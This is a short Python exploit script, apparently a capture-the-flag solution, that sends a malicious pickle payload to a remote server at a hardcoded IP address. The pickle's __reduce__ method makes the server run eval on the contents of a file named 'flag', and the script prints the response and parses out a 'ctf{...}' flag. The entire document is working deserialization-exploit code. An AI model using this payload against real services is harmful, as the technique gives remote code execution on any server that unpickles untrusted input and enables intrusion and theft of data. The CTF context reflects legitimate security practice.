import _pickle as cPickle
import base64
import os
import string
import requests
import time

class Exploit(object):
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

def sendPayload(p):
	newp = base64.urlsafe_b64encode(p).decode()
	headers = {'Content-Type': 'application/yakoo'}
	r = requests.post("http://35.242.253.155:30788/",headers=headers,data=newp)
	return r.text


payload_dec = cPickle.dumps(Exploit(), protocol=2)
print(sendPayload(payload_dec))
#print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + "}")